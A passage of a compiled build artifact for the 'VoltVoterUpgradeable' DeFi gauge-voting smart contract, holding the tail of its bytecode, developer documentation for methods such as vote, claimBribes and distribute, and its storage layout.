546001600160a01b0316905081565b60005b815181101561092157818181518110611d8f57611d8f6137a7565b60200260200101516001600160a01b031663d294f0936040518163ffffffff1660e01b815260040160408051808303816000875af1158015611dd5573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611df99190613a66565b50508080611e06906137d3565b915050611d74565b60005b815181101561092157611e3c828281518110611e2f57611e2f6137a7565b6020026020010151612e1e565b80611e46816137d3565b915050611e11565b60008111611e6e5760405162461bcd60e51b81526004016107b190613974565b6001546040516331a9108f60e11b815260048101839052620100009091046001600160a01b031690636352211e90602401602060405180830381865afa158015611ebc573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611ee0919061378a565b6001600160a01b0316336001600160a01b031614611f105760405162461bcd60e51b81526004016107b190613876565b611f18612c9d565b6001546040516339f890b560e21b815260048101849052620100009091046001600160a01b03169063e7e242d490602401602060405180830381865afa158015611f66573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611f8a9190613994565b11611fa75760405162461bcd60e51b81526004016107b1906139ad565b604051633d509c9760e01b81526001600160a01b038481166004830152831690633d509c9790602401611138565b60015460405163430c208160e01b815233600482015260248101879052620100009091046001600160a01b03169063430c208190604401602060405180830381865afa158015612029573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061204d9190613854565b6120695760405162461bcd60e51b81526004016107b190613876565b8281146120a25760405162461bcd60e51b81526020600482015260076024820152662161727261797360c81b60448201526064016107b1565b6000805b8481101561212d5760008484838181106120c2576120c26137a7565b90506020020135136120f5578383828181106120e0576120e06137a7565b905060200201356120f090613896565b61210f565b838382818110612107576121076137a7565b905060200201355b61211990836138b2565b915080612125816137d3565b9150506120a6565b5060648113156121715760405162461bcd60e51b815260206004820152600f60248201526e1d1bdd185b159bdd1955d95a59da1d608a1b60448201526064016107b1565b606490506108d98686868080602002602001604051908101604052809392919081815260200183836020028082843760009201919091525050604080516020808a0282810182019093528982529093508992508891829185019084908082843760009201919091525087925061285c915050565b3360009081526010602052604090205460ff166122145760405162461bcd60e51b81526004016107b190613954565b604080518481526020810183905233916001600160a01b038516917ff341246adaac6f497bc2a656f546ab9e182111d630394f0c57c710a59a2cb5679101610dac565b60015460405163430c208160e01b815233600482015260248101879052620100009091046001600160a01b03169063430c208190604401602060405180830381865afa1580156122ab573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906122cf9190613854565b6122eb5760405162461bcd60e51b81526004016107b190613876565b8281146123245760405162461bcd60e51b81526020600482015260076024820152662161727261797360c81b60448201526064016107b1565b6000805b848110156123af576000848483818110612344576123446137a7565b905060200201351361237757838382818110612362576123626137a7565b9050602002013561237290613896565b612391565b838382818110612389576123896137a7565b905060200201355b61239b90836138b2565b9150806123a7816137d3565b915050612328565b506108d98686868080602002602001604051908101604052809392919081815260200183836020028082843760009201919091525050604080516020808a0282810182019093528982529093508992508891829185019084908082843760009201919091525087925061285c915050565b6000546001146124635760405162461bcd60e51b815260206004820152600e60248201526d1499595b9d1c985b9d0818d85b1b60921b60448201526064016107b1565b6002600081905550600660009054906101000a90046001600160a01b03166001600160a01b031663a83627de6040518163ffffffff1660e01b81526004016020604051808303816000875af11580156124c0573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906124e49190613994565b506124ee81612e1e565b6001600160a01b0381811660008181526014602052604090819020546003549151634cde602960e11b81529190931660048201526399bcc05290602401602060405180830381865afa158015612548573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061256c9190613994565b811180156125865750600061258462093a8083613928565b115b15612643576001600160a01b0382811660008181526014602052604080822091909155600354905163b66503cf60e01b815292166004830152602482018390529063b66503cf90604401600060405180830381600087803b1580156125ea57600080fd5b505af11580156125fe573d6000803e3d6000fd5b50506040518381526001600160a01b03851692503391507f4fa9693cae526341d334e2862ca2413b2e503f1266255f9e0869fb36e6d89b179060200160405180910390a35b50506001600055565b6000818152600e6020526040812080549091805b8281101561282057600084828154811061267c5761267c6137a7565b6000918252602080832090910154888352600d825260408084206001600160a01b0392831680865290845281852054600990945293205492935090916126c29116612e1e565b6001600160a01b0382166000908152600c6020526040812080548392906126ea908490613a8a565b90915550506000878152600d602090815260408083206001600160a01b038616845290915281208054839290612721908490613a8a565b909155505060008113156127c5576001600160a01b0382811660009081526009602090815260408083205484168352600b9091529081902054905163278afc8b60e21b815260048101849052602481018a9052911690639e2bf22c90604401600060405180830381600087803b15801561279a57600080fd5b505af11580156127ae573d6000803e3d6000fd5b5050505080846127be91906138b2565b93506127d2565b6127cf8185613a8a565b93505b60408051888152602081018390527f6b3894ce60b9bbe9d93f1a4e6fc25b6b93cd8222e73ab6348d79c596f5b51de9910160405180910390a150508080612818906137d3565b915050612660565b5080600760008282546128339190613ac9565b90915550506000848152600f60209081526040808320839055600e90915281206113079161323c565b6128658461264c565b82516001546040516339f890b560e21b8152600481018790526000916201000090046001600160a01b03169063e7e242d490602401602060405180830381865afa1580156128b7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906128db9190613994565b905060008060005b84811015612b925760008882815181106128ff576128ff6137a7565b6020908102919091018101516001600160a01b038082166000908152600990935260408320548b51929450169190899088908c9087908110612943576129436137a7565b60200260200101516129559190613ae0565b61295f9190613b65565b60008d8152600d602090815260408083206001600160a01b0388168452909152902054909150156129c35760405162461bcd60e51b815260206004820152600e60248201526d191d5c1b1a58d85d19481c1bdbdb60921b60448201526064016107b1565b80600003612a005760405162461bcd60e51b815260206004820152600a6024820152693d32b937903837bbb2b960b11b60448201526064016107b1565b612a0982612e1e565b60008c8152600e6020908152604080832080546001810182559084528284200180546001600160a01b0319166001600160a01b0388169081179091558352600c90915281208054839290612a5e9084906138b2565b909155505060008c8152600d602090815260408083206001600160a01b038716845290915281208054839290612a959084906138b2565b90915550506000811315612b1c576001600160a01b038083166000908152600b60205260409081902054905163f320772360e01b815260048101849052602481018f905291169063f320772390604401600060405180830381600087803b158015612aff57600080fd5b505af1158015612b13573d6000803e3d6000fd5b50505050612b28565b612b2581613896565b90505b612b3281866138b2565b9450612b3e81876138b2565b604080518e81526020810184905291975033917f1263a2295e53acd6ef8f655b8afc11fa0f2cf11925be7aa1757d741ef32a926c910160405180910390a25050508080612b8a906137d3565b9150506128e3565b506000811315612c005760015460405163fd4a77f160e01b8152600481018a9052620100009091046001600160a01b03169063fd4a77f190602401600060405180830381600087803b158015612be757600080fd5b505af1158015612bfb573d6000803e3d6000fd5b505050505b8160076000828254612c12919061393c565b90915550506000978852600f602052604090972096909655505050505050565b6040516001600160a01b03808516602483015283166044820152606481018290526113079085906323b872dd60e01b906084015b60408051601f198184030181529190526020810180516001600160e01b03166001600160e01b03199093169290921790915261305f565b6003546006546040516370a0823160e01b81526001600160a01b03918216600482015260009260149216906370a0823190602401602060405180830381865afa158015612cee573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612d129190613994565b600160029054906101000a90046001600160a01b03166001600160a01b03166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015612d65573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612d899190613994565b600360009054906101000a90046001600160a01b03166001600160a01b03166318160ddd6040518163ffffffff1660e01b8152600401602060405180830381865afa158015612ddc573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190612e009190613994565b612e0a9190613ac9565b612e149190613ac9565b6113ec9190613928565b6001600160a01b038082166000908152600a6020908152604080832054909316808352600c9091529181205490811315612ee0576001600160a01b038316600090815260136020526040812080546012549182905591612e7e8383613ac9565b905080156108d9576000670de0b6b3a7640000612e9b83876138f3565b612ea59190613928565b6001600160a01b038816600090815260146020526040812080549293508392909190612ed290849061393c565b909155505050505050505050565b6012546001600160a01b038416600090815260136020526040902055505050565b6001600160a01b03811660009081526011602052604090205460ff1615612f605760405162461bcd60e51b8152602060048201526013602482015272185b1c9958591e481dda1a5d195b1a5cdd1959606a1b60448201526064016107b1565b6001600160a01b038116600081815260116020526040808220805460ff191660011790555133917f6661a7108aecd07864384529117d96c319c1163e3010c01390f6b704726e07de91a350565b604051636eb1769f60e11b81523060048201526001600160a01b038381166024830152600091839186169063dd62ed3e90604401602060405180830381865afa158015612ffe573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906130229190613994565b61302c919061393c565b6040516001600160a01b03851660248201526044810182905290915061130790859063095ea7b360e01b90606401612c66565b60006130b4826040518060400160405280602081526020017f5361666545524332303a206c6f772d6c6576656c2063616c6c206661696c6564815250856001600160a01b03166131319092919063ffffffff16565b8051909150156109d657808060200190518101906130d29190613854565b6109d65760405162461bcd60e51b815260206004820152602a60248201527f5361666545524332303a204552433230206f7065726174696f6e20646964206e6044820152691bdd081cdd58d8d9595960b21b60648201526084016107b1565b60606001600160a01b0384163b61318a5760405162461bcd60e51b815260206004820152601d60248201527f416464726573733a2063616c6c20746f206e6f6e2d636f6e747261637400000060448201526064016107b1565b600080856001600160a01b0316856040516131a59190613bbf565b6000604051808303816000865af19150503d80600081146131e2576040519150601f19603f3d011682016040523d82523d6000602084013e6131e7565b606091505b50915091506131f7828286613203565b925050505b9392505050565b606083156132125750816131fc565b8251156132225782518084602001fd5b8160405162461bcd60e51b81526004016107b19190613bdb565b50805460008255906000526020600020908101906111bf91905b8082111561326a5760008155600101613256565b5090565b6001600160a01b03811681146111bf57600080fd5b60006020828403121561329557600080fd5b81356131fc8161326e565b600080600080600060a086880312156132b857600080fd5b85356132c38161326e565b945060208601356132d38161326e565b935060408601356132e38161326e565b925060608601356132f38161326e565b915060808601356133038161326e565b809150509295509295909350565b634e487b7160e01b600052604160045260246000fd5b604051601f8201601f1916810167ffffffffffffffff8111828210171561335057613350613311565b604052919050565b600067ffffffffffffffff82111561337257613372613311565b5060051b60200190565b600082601f83011261338d57600080fd5b813560206133a261339d83613358565b613327565b82815260059290921b840181019181810190868411156133c157600080fd5b8286015b848110156133e55780356133d88161326e565b83529183019183016133c5565b509695505050505050565b60006020828403121561340257600080fd5b813567ffffffffffffffff81111561341957600080fd5b6134258482850161337c565b949350505050565b600082601f83011261343e57600080fd5b8135602061344e61339d83613358565b82815260059290921b8401810191818101908684111561346d57600080fd5b8286015b848110156133e557803567ffffffffffffffff8111156134915760008081fd5b61349f8986838b010161337c565b845250918301918301613471565b600080604083850312156134c057600080fd5b823567ffffffffffffffff808211156134d857600080fd5b6134e48683870161337c565b935060208501359150808211156134fa57600080fd5b506135078582860161342d565b9150509250929050565b60006020828403121561352357600080fd5b5035919050565b6000806040838503121561353d57600080fd5b82359150602083013561354f8161326e565b809150509250929050565b60008060006060848603121561356f57600080fd5b833561357a8161326e565b9250602084013561358a8161326e565b929592945050506040919091013590565b600080604083850312156135ae57600080fd5b50508035926020909101359150565b6000806000606084860312156135d257600080fd5b833567ffffffffffffffff808211156135ea57600080fd5b6135f68783880161337c565b9450602086013591508082111561360c57600080fd5b506136198682870161342d565b925050604084013590509250925092565b6000806040838503121561363d57600080fd5b823567ffffffffffffffff81111561365457600080fd5b6136608582860161337c565b925050602083013561354f8161326e565b6000806040838503121561368457600080fd5b823561368f8161326e565b946020939093013593505050565b6000806000606084860312156136b257600080fd5b83359250602084013561358a8161326e565b60008083601f8401126136d657600080fd5b50813567ffffffffffffffff8111156136ee57600080fd5b6020830191508360208260051b850101111561370957600080fd5b9250929050565b60008060008060006060868803121561372857600080fd5b85359450602086013567ffffffffffffffff8082111561374757600080fd5b61375389838a016136c4565b9096509450604088013591508082111561376c57600080fd5b50613779888289016136c4565b969995985093965092949392505050565b60006020828403121561379c57600080fd5b81516131fc8161326e565b634e487b7160e01b600052603260045260246000fd5b634e487b7160e01b600052601160045260246000fd5b6000600182016137e5576137e56137bd565b5060010190565b600081518084526020808501945080840160005b838110156138255781516001600160a01b031687529582019590820190600101613800565b509495945050505050565b6001600160a01b0383168152604060208201819052600090613425908301846137ec565b60006020828403121561386657600080fd5b815180151581146131fc57600080fd5b60208082526006908201526510b7bbb732b960d11b604082015260600190565b6000600160ff1b82016138ab576138ab6137bd565b5060000390565b600080821280156001600160ff1b03849003851316156138d4576138d46137bd565b600160ff1b83900384128116156138ed576138ed6137bd565b50500190565b600081600019048311821515161561390d5761390d6137bd565b500290565b634e487b7160e01b600052601260045260246000fd5b60008261393757613937613912565b500490565b6000821982111561394f5761394f6137bd565b500190565b60208082526006908201526521676175676560d01b604082015260600190565b60208082526006908201526510ba37b5b2b760d11b604082015260600190565b6000602082840312156139a657600080fd5b5051919050565b60208082526006908201526510b837bbb2b960d11b604082015260600190565b82815260406020820152600061342560408301846137ec565b600080604083850312156139f957600080fd5b8251613a048161326e565b602084015190925061354f8161326e565b6020815260006131fc60208301846137ec565b6001600160a01b038581168252848116602083015283166040820152608060608201819052600090613a5c908301846137ec565b9695505050505050565b60008060408385031215613a7957600080fd5b505080516020909101519092909150565b60008083128015600160ff1b850184121615613aa857613aa86137bd565b6001600160ff1b0384018313811615613ac357613ac36137bd565b50500390565b600082821015613adb57613adb6137bd565b500390565b60006001600160ff1b0381841382841380821686840486111615613b0657613b066137bd565b600160ff1b6000871282811687830589121615613b2557613b256137bd565b60008712925087820587128484161615613b4157613b416137bd565b87850587128184161615613b5757613b576137bd565b505050929093029392505050565b600082613b7457613b74613912565b600160ff1b821460001984141615613b8e57613b8e6137bd565b500590565b60005b83811015613bae578181015183820152602001613b96565b838111156113075750506000910152565b60008251613bd1818460208701613b93565b9190910192915050565b6020815260008251806020840152613bfa816040850160208701613b93565b601f01601f1916919091016040019291505056fea2646970667358221220885eb628ca1258d2361a7f5dccc10713999cf022d77996b98579b7bc6fc0459e64736f6c634300080d0033",
  "devdoc": {
    "kind": "dev",
    "methods": {
      "attachTokenToGauge(uint256,address)": {
        "details": "A gauge should be able to attach a token for preventing transfers/withdraws."
      },
      "claimBribes(address[],address[][],uint256)": {
        "details": "Batch claim rewards from given bribe contracts for given tokenId."
      },
      "claimFees(address[],address[][],uint256)": {
        "details": "Claim fees from given bribes."
      },
      "claimRewards(address[],address[][])": {
        "details": "Batch claim rewards from given gauges."
      },
      "createGauge(address)": {
        "details": "Create gauge for given pool. Only for a pool with whitelisted tokens."
      },
      "detachTokenFromGauge(uint256,address)": {
        "details": "Detach given token."
      },
      "distribute(address)": {
        "details": "Get emission from minter and notify rewards for given gauge."
      },
      "distributeAll()": {
        "details": "Distribute rewards for all pools."
      },
      "distributeFees(address[])": {
        "details": "Move fees from deposited pools to bribes for given gauges."
      },
      "emitDeposit(uint256,address,uint256)": {
        "details": "Emit deposit event for easily handling external actions."
      },
      "emitWithdraw(uint256,address,uint256)": {
        "details": "Emit withdraw event for easily handling external actions."
      },
      "listingFee()": {
        "details": "Amount of tokens required to be hold for whitelisting."
      },
      "notifyRewardAmount(uint256)": {
        "details": "Add rewards to this contract. Usually it is VoltMinter."
      },
      "poke(uint256)": {
        "details": "Resubmit exist votes for given token. For internal purposes."
      },
      "poolsLength()": {
        "details": "Length of pools"
      },
      "registerRewardToken(address,address,uint256)": {
        "details": "Add a token to a gauge/bribe as possible reward."
      },
      "removeRewardToken(address,address,uint256)": {
        "details": "Remove a token from a gauge/bribe allowed rewards list."
      },
      "reset(uint256)": {
        "details": "Remove all votes for given tokenId."
      },
      "updateAll()": {
        "details": "Update all gauges."
      },
      "updateFor(address[])": {
        "details": "Update given gauges."
      },
      "updateForRange(uint256,uint256)": {
        "details": "Update gauges by indexes in a range."
      },
      "updateGauge(address)": {
        "details": "Update reward info for given gauge."
      },
      "vote(uint256,address[],int256[])": {
        "details": "Vote for given pools using a vote power of given tokenId. Reset previous votes."
      },
      "whitelist(address,uint256)": {
        "details": "Add token to whitelist. Only pools with whitelisted tokens can be added to gauge."
      }
    },
    "stateVariables": {
      "DURATION": {
        "details": "Rewards are released over 7 days"
      },
      "bribes": {
        "details": "gauge => bribe"
      },
      "factory": {
        "details": "VoltFactory"
      },
      "gauges": {
        "details": "pool => gauge"
      },
      "poolForGauge": {
        "details": "gauge => pool"
      },
      "poolVote": {
        "details": "nft => pools"
      },
      "pools": {
        "details": "All pools viable for incentives"
      },
      "totalWeight": {
        "details": "Total voting weight"
      },
      "usedWeights": {
        "details": "nft => total voting weight of user"
      },
      "ve": {
        "details": "The ve token that governs these contracts"
      },
      "votes": {
        "details": "nft => pool => votes"
      },
      "weights": {
        "details": "pool => weight"
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 233,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "_unlocked",
        "offset": 0,
        "slot": "0",
        "type": "t_uint256"
      },
      {
        "astId": 26995,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "_initialized",
        "offset": 0,
        "slot": "1",
        "type": "t_bool"
      },
      {
        "astId": 26998,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "_initializing",
        "offset": 1,
        "slot": "1",
        "type": "t_bool"
      },
      {
        "astId": 22001,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "ve",
        "offset": 2,
        "slot": "1",
        "type": "t_address"
      },
      {
        "astId": 22004,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "factory",
        "offset": 0,
        "slot": "2",
        "type": "t_address"
      },
      {
        "astId": 22006,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "token",
        "offset": 0,
        "slot": "3",
        "type": "t_address"
      },
      {
        "astId": 22008,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "gaugeFactory",
        "offset": 0,
        "slot": "4",
        "type": "t_address"
      },
      {
        "astId": 22010,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "bribeFactory",
        "offset": 0,
        "slot": "5",
        "type": "t_address"
      },
      {
        "astId": 22016,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "minter",
        "offset": 0,
        "slot": "6",
        "type": "t_address"
      },
      {
        "astId": 22019,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "totalWeight",
        "offset": 0,
        "slot": "7",
        "type": "t_uint256"
      },
      {
        "astId": 22023,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "pools",
        "offset": 0,
        "slot": "8",
        "type": "t_array(t_address)dyn_storage"
      },
      {
        "astId": 22028,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "gauges",
        "offset": 0,
        "slot": "9",
        "type": "t_mapping(t_address,t_address)"
      },
      {
        "astId": 22033,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "poolForGauge",
        "offset": 0,
        "slot": "10",
        "type": "t_mapping(t_address,t_address)"
      },
      {
        "astId": 22038,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "bribes",
        "offset": 0,
        "slot": "11",
        "type": "t_mapping(t_address,t_address)"
      },
      {
        "astId": 22043,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "weights",
        "offset": 0,
        "slot": "12",
        "type": "t_mapping(t_address,t_int256)"
      },
      {
        "astId": 22050,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "votes",
        "offset": 0,
        "slot": "13",
        "type": "t_mapping(t_uint256,t_mapping(t_address,t_int256))"
      },
      {
        "astId": 22056,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "poolVote",
        "offset": 0,
        "slot": "14",
        "type": "t_mapping(t_uint256,t_array(t_address)dyn_storage)"
      },
      {
        "astId": 22061,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "usedWeights",
        "offset": 0,
        "slot": "15",
        "type": "t_mapping(t_uint256,t_uint256)"
      },
      {
        "astId": 22065,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "isGauge",
        "offset": 0,
        "slot": "16",
        "type": "t_mapping(t_address,t_bool)"
      },
      {
        "astId": 22069,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "isWhitelisted",
        "offset": 0,
        "slot": "17",
        "type": "t_mapping(t_address,t_bool)"
      },
      {
        "astId": 22071,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "index",
        "offset": 0,
        "slot": "18",
        "type": "t_uint256"
      },
      {
        "astId": 22075,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "supplyIndex",
        "offset": 0,
        "slot": "19",
        "type": "t_mapping(t_address,t_uint256)"
      },
      {
        "astId": 22079,
        "contract": "contracts/base/vote/VoltVoterUpgradeable.sol:VoltVoterUpgradeable",
        "label": "claimable",
        "offset": 0,
        "slot": "20",
        "type": "t_mapping(t_address,t_uint256)"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_array(t_address)dyn_storage": {
        "base": "t_address",
        "encoding": "dynamic_array",
        "label": "address[]",
        "numberOfBytes": "32"
      },
      "t_bool": {
        "encoding": "inplace",
        "label": "bool",
        "numberOfBytes": "1"
      },
      "t_int256": {
        "encoding": "inplace",
        "label": "int256",
        "numberOfBytes": "32"
      },
      "t_mapping(t_address,t_address)": {
        "encoding": "mapping",
        "key": "t_address",
        "label": "mapping(address => address)",
        "numberOfBytes": "32",
        "value": "t_address"
      },
      "t_mapping(t_address,t_bool)": {
        "encoding": "mapping",
        "key": "t_address",
        "label": "mapping(address => bool)",
        "numberOfBytes": "32",
        "value": "t_bool"
      },
      "t_mapping(t_address,t_int256)": {
        "encoding": "mapping",
        "key": "t_address",
        "label": "mapping(address => int256)",
        "numberOfBytes": "32",
        "value": "t_int256"
      },
      "t_mapping(t_address,t_uint256)": {
        "encoding": "mapping",
        "key": "t_address",
        "label": "mapping(address => uint256)",
        "numberOfBytes": "32",
        "value": "t_uint256"
      },
      "t_mapping(t_uint256,t_array(t_address)dyn_storage)": {
        "encoding": "mapping",
        "key": "t_uint256",
        "label": "mapping(uint256 => address[])",
        "numberOfBytes": "32",
        "value": "t_array(t_address)dyn_storage"
      },
      "t_mapping(t_uint256,t_mapping(t_address,t_int256))": {
        "encoding": "mapping",
        "key": "t_uint256",
        "label": "mapping(uint256 => mapping(address => int256))",
        "numberOfBytes": "32",
        "value": "t_mapping(t_address,t_int256)"
      },
      "t_mapping(t_uint256,t_uint256)": {
        "encoding": "mapping",
        "key": "t_uint256",
        "label": "mapping(uint256 => uint256)",
        "numberOfBytes": "32",
        "value": "t_uint256"
      },
      "t_uint256": {
        "encoding": "inplace",
        "label": "uint256",
        "numberOfBytes": "32"
      }
    }
  }
}